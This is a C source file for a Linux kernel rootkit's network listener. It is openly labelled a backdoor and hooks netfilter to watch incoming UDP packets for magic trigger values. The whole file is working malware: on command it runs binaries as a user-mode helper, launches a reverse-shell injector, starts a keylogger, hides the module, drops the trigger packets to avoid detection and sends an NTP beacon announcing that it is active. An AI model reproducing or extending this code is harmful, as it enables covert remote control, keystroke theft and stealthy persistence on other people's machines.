// Backdoor that filters incoming packets for magic payloads and initiates actions
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/workqueue.h>
#include <linux/types.h>
#include <linux/jiffies.h>
#include <linux/spinlock.h>
#include "rootkit.h"

#define SUCCESS 0

#define MIN_INTERVAL (5 * HZ) // 5 seconds

static struct nf_hook_ops nfho;

static bool injector_initialized = false;
static bool keylogger_initialized = false;
static bool hide_module_initialized = false;

static unsigned long last_binary_receiver_time = 0;
static unsigned long last_injector_time = 0;
static unsigned long last_injector_exit_time = 0;
static unsigned long last_keylogger_time = 0;
static unsigned long last_keylogger_exit_time = 0;
static unsigned long last_hide_time = 0;
static unsigned long last_helper_rec_sig_time = 0;

static DEFINE_SPINLOCK(action_lock);

static void binary_runner_work_func(struct work_struct *work)
{
    char *argv[] = {REC_PATH, NULL};
    char *envp[] = {"HOME=/",
                    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                    NULL};

    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret)
        DBG_PRINT("[Listener] Runner failed: %d\n", ret);
    else
        DBG_PRINT("[Listener] Runner ran successfully\n");
}

static void keylogger_work_func(struct work_struct *work)
{
    int ret = keylogger_init();
    if (ret)
        DBG_PRINT("[Listener] Keylogger init failed: %d\n", ret);
}

static void keylogger_exit_work_func(struct work_struct *work)
{
    keylogger_cleanup();
    DBG_PRINT("[Listener] Keylogger exited\n");
}

static void injector_work_func(struct work_struct *work)
{
    char *argv[] = {REC_PATH, "s", NULL}; // "S" to signal receiver_helper that an so is expected 
    char *envp[] = {"HOME=/",
                    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                    NULL};

    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret)
        DBG_PRINT("[Listener] Runner failed: %d\n", ret);
    else
        DBG_PRINT("[Listener] Runner ran successfully\n");
}

static void injector_exit_work_func(struct work_struct *work)
{
    injector_cleanup();
    DBG_PRINT("[Listener] Injector exited\n");
}

static void hide_work_func(struct work_struct *work)
{
    hide_module();
    DBG_PRINT("Hiding module\n");
}

static void helper_rec_sig_work_func(struct work_struct *work)
{
    // On a signal from receiver_helper
    int ret = injector_init();
    if (ret)
        DBG_PRINT("[Listener] Injector init failed: %d\n", ret);
    else
        DBG_PRINT("[Listener] Injector initialized\n");
}

static DECLARE_WORK(binary_runner_work, binary_runner_work_func);
static DECLARE_WORK(injector_work, injector_work_func);
static DECLARE_WORK(injector_exit_work, injector_exit_work_func);
static DECLARE_WORK(keylogger_work, keylogger_work_func);
static DECLARE_WORK(keylogger_exit_work, keylogger_exit_work_func);
static DECLARE_WORK(hide_work, hide_work_func);
static DECLARE_WORK(helper_rec_sig_work, helper_rec_sig_work_func);

// This function is called for every incoming packet
static unsigned int hook_func(void *priv,
                              struct sk_buff *skb,
                              const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    unsigned char *user_data;
    unsigned int user_data_len;

    if (!skb)
        return NF_ACCEPT;

    ip_header = ip_hdr(skb);
    if (!ip_header)
        return NF_ACCEPT;

    // Check if IPv4 and UDP
    // Used to be TCP, worked terribly with constant bouncing (probably because of retransmissions)
    if (ip_header->protocol == IPPROTO_UDP)
    {
        struct udphdr *udp_header = udp_hdr(skb);
        if (!udp_header)
            return NF_ACCEPT;
    
        // UDP payload pointer and length
        user_data = (unsigned char *)((unsigned char *)udp_header + sizeof(struct udphdr));
        user_data_len = ntohs(udp_header->len) - sizeof(struct udphdr);
    
        if (user_data_len >= sizeof(u32))
        {
            u32 payload_hash;
            memcpy(&payload_hash, user_data, sizeof(u32));
            payload_hash = ntohl(payload_hash);

            unsigned long now = jiffies;
            unsigned long flags;

            switch (payload_hash)
            {
                case BINARY_RUNNER_PAYLOAD:
                    spin_lock_irqsave(&action_lock, flags);
                    if (time_after(now, last_binary_receiver_time + MIN_INTERVAL))
                    {
                        last_binary_receiver_time = now;
                        schedule_work(&binary_runner_work);
                        DBG_PRINT("[Listener] Magic packet detected from %pI4:%d\n",
                                &ip_header->saddr, ntohs(ntohs(udp_header->source)
                            ));
                    }
                    spin_unlock_irqrestore(&action_lock, flags);
                    break;
                case INJECTOR_PAYLOAD:
                    spin_lock_irqsave(&action_lock, flags);
                    if (time_after(now, last_injector_time + MIN_INTERVAL))
                    {
                        last_injector_time = now;
                        if (!injector_initialized)
                        {
                            schedule_work(&injector_work);
                            DBG_PRINT("[Listener] Reverse shell magic packet detected from %pI4:%d\n",
                                    &ip_header->saddr, ntohs(ntohs(udp_header->source)
                                ));
                            injector_initialized = true;
                        }
                    }
                    spin_unlock_irqrestore(&action_lock, flags);
                    break;
                case INJECTOR_EXIT_PAYLOAD:
                    spin_lock_irqsave(&action_lock, flags);
                    if (time_after(now, last_injector_exit_time + MIN_INTERVAL))
                    {
                        last_injector_exit_time = now;
                        if (injector_initialized)
                        {
                            schedule_work(&injector_exit_work);
                            DBG_PRINT("[Listener] Reverse shell exit magic packet detected from %pI4:%d\n",
                                    &ip_header->saddr, ntohs(ntohs(udp_header->source)
                                ));
                            injector_initialized = false;
                        }
                    }
                    spin_unlock_irqrestore(&action_lock, flags);
                    break;  
                case KEYLOGGER_PAYLOAD:
                    spin_lock_irqsave(&action_lock, flags);
                    if (time_after(now, last_keylogger_time + MIN_INTERVAL))
                    {
                        last_keylogger_time = now;
                        if (!keylogger_initialized)
                        {
                            schedule_work(&keylogger_work);
                            DBG_PRINT("[Listener] Keylogger magic packet detected from %pI4:%d\n",
                                    &ip_header->saddr, ntohs(ntohs(udp_header->source)
                                ));
                            keylogger_initialized = true;
                        }
                    }
                    spin_unlock_irqrestore(&action_lock, flags);
                    break;
                case KEYLOGGER_EXIT_PAYLOAD:
                    spin_lock_irqsave(&action_lock, flags);
                    if (time_after(now, last_keylogger_exit_time + MIN_INTERVAL))
                    {
                        last_keylogger_exit_time = now;
                        if (keylogger_initialized)
                        {
                            schedule_work(&keylogger_exit_work);
                            DBG_PRINT("[Listener] Keylogger exit magic packet detected from %pI4:%d\n",
                                    &ip_header->saddr, ntohs(ntohs(udp_header->source)
                                ));
                            keylogger_initialized = false;
                        }
                    }
                    spin_unlock_irqrestore(&action_lock, flags);
                    break;
                case HIDE_PAYLOAD:
                    spin_lock_irqsave(&action_lock, flags);
                    if (time_after(now, last_hide_time + MIN_INTERVAL))
                    {
                        last_hide_time = now;
                        if (!hide_module_initialized)
                        {
                            schedule_work(&hide_work);
                            DBG_PRINT("[Listener] Hide magic packet detected from %pI4:%d\n",
                                    &ip_header->saddr, ntohs(ntohs(udp_header->source)
                                ));
                            hide_module_initialized = true;
                        }
                    }
                    spin_unlock_irqrestore(&action_lock, flags);
                    break;
                case HELPER_REC_SIG_PAYLOAD:
                    // This payload is used to receive signals from helper
                    spin_lock_irqsave(&action_lock, flags);
                    if (time_after(now, last_helper_rec_sig_time + MIN_INTERVAL))
                    {
                        last_helper_rec_sig_time = now;
                        schedule_work(&helper_rec_sig_work);
                        DBG_PRINT("[Listener] Receiver_helper magic packet detected from %pI4:%d\n",
                            &ip_header->saddr, ntohs(ntohs(udp_header->source)));
                    }
                    spin_unlock_irqrestore(&action_lock, flags);
                    break;
                default:
                    // No magic payload is detected, accepting the packet
                    return NF_ACCEPT;
            }
            // Dropping the packet so it doesn’t reach userspace
            return NF_DROP;
        }
    }
    // No magic payload is detected, accepting the packet
    return NF_ACCEPT;
}

int listener_init(void)
{
    nfho.hook = hook_func;
    nfho.hooknum = NF_INET_PRE_ROUTING; // Incoming packets
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);
    send_ntp_beacon(); // Send NTP beacon signaling that the backdoor is active
    DBG_PRINT("[Listener] Backdoor loaded, registering netfilter hook\n");
    return SUCCESS;
}

void listener_cleanup(void)
{
    nf_unregister_net_hook(&init_net, &nfho);
    // Check if the work is pending before canceling
    if (keylogger_initialized)
        keylogger_cleanup();
    if (injector_initialized)
        injector_cleanup();
    DBG_PRINT("[Listener] Backdoor unloaded, unregistering netfilter hook\n");
}
